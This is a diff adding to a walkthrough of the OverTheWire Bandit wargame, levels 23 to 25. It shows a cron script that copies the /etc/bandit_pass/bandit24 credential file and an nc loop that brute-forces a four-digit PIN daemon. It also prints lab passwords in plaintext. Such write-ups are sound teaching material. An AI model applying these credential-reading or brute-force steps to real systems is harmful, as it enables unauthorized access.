@@ -529,6 +529,7 @@ Level 23 -> Level 24
         $ nano myscript.sh
     opens up nano and remembering that the password for the next level is stored in /etc/bandit_pass/bandit24 (and that it is the user bandit24 that is actually executing the script - the same user that has access to reading the file containing the password), the script then has to be something like
         #!/bin/bash
+
         cat /etc/bandit_pass/bandit24 > /tmp/tmp.1K2VYdddBX/bandit24_password.
     The scripts can be saved using Ctrl+S and nano can be closed using Ctrl+X. Now the file "bandit24_password" is needed. "touch" is a command that can be used to make files:
         $ touch bandit24_password
@@ -548,7 +549,36 @@ Level 23 -> Level 24
 
 Level 24 -> Level 25
 -----------------------
-    
+    This time a daemon is listening on port 30002. It will give the password for the next level if given the password for bandit24 along with a secret 4-digit pin. Apparently there is no way to get the pin other than just brute force. This gives a total of 10000 different numbers to try. Obviously some automation is needed. However apparently it is not necessary to create a new connection each time.
+        $ nc localhost 30002
+    gives
+        I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+        Timeout. Exiting.
+    Okay it was timed out, but reconnecting actually gives one the chance to put in the password along with a pin code. A small script is needed to make all the possible combinations and then they can be sent off with nc. So
+        $ mktemp -d
+        /tmp/tmp.4I2yFTRAJ4
+    makes the temporary working directory "/tmp/tmp.4I2yFTRAJ4".
+        $ cd /tmp/tmp.4I2yFTRAJ4
+        $ nano script.sh
+    is then used to change to this directory and start making a shell script. The script will be
+        #!/bin/bash
+
+        for i in {0000..9999}
+        do
+        	echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i 
+        done | nc localhost 30002.
+    The script generates all possible values of the password from before and a 4-digit pin code before pipelining them into nc that is connected to the localhost on port 30002. The script has to have permissions changed, such that it can be executed:
+        $ chmod +x script.sh
+    and executing the script then gives off a lot of returned
+        Wrong! Please enter the correct pincode. Try again.
+    but at some point it returns
+        Correct!
+        The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d.
+
+
+Level 25 -> Level 26
+-----------------------
+    The shell for bandit26 is apparently not /bin/bash, but something else. The challenge is to find out what it is, how it works and how to break out of it. Somehow this is supposed to accomplish logging into bandit26 from bandit25.
 
 
         
